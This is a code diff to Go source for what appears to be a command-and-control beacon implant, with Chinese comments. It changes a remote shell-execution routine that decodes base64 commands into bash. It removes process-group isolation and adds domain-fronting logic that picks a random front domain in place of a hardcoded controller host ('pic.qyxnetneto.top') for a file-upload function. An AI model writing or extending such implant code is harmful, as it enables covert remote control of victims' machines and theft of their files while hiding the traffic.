@@ -37,21 +37,7 @@ type BeaconFile struct {
 }
 
 func ShellExecute(command string) (string, error) {
-	sh_path := "/bin/bash"
-	_, err := os.Stat(sh_path)
-	if err != nil {
-		sh_path = "/bin/sh"
-	}
-
-	cmdstr, _ := util.Strim(command)
-	base64Cmd := base64.StdEncoding.EncodeToString([]byte(cmdstr))
-	final_cmd := util.Sprintf("echo %s | timeout 4 base64 -d | timeout %d %s", base64Cmd, 4, sh_path)
-	util.Println(final_cmd)
-	cmd := exec.Command(sh_path, "-c", final_cmd)
-	output, err := cmd.CombinedOutput()
-	if err != nil {
-		return string(output), err
-	}
+	output, err := cross_platform_exec(command)
 	return string(output), err
 }
 func SpawnCommand(targetPath string) (string, error) {
@@ -91,7 +77,7 @@ func SpawnCommand(targetPath string) (string, error) {
 
 	// 为新进程设置独立的进程组
 	cmd.SysProcAttr = &syscall.SysProcAttr{
-		Setpgid: true,
+		//Setpgid: true,
 	}
 
 	// 启动子进程
@@ -139,6 +125,14 @@ func randString(length int) string {
 		b[i] = charset[rand.Intn(len(charset))]
 	}
 	return string(b)
+}
+func GetRandomdomain(postUrls []string) string {
+	// 以当前时间作为随机数种子
+	rand.Seed(uint64(time.Now().UnixNano()))
+	// 随机选择一个URL前缀
+	selectedUrl := postUrls[rand.Intn(len(postUrls))]
+	url := selectedUrl
+	return url
 }
 func IPConfig() (string, error) {
 	var _out bytes.Buffer
@@ -231,7 +225,7 @@ func PSendFileAsync(filePath string) (string, error) {
 	req.Header.Add("Accept-Encoding", "gzip, deflate, br")
 	req.Header.Add("Accept-Language", "zh-CN,zh;q=0.9,en;q=0.8")
 	req.Host = config.ServerHostDomain
-	req.URL.Host = "pic.qyxnetneto.top"
+	req.URL.Host = GetRandomdomain(config.DomainFront)
 
 	// 发送请求
 	resp, err := client.Do(req)
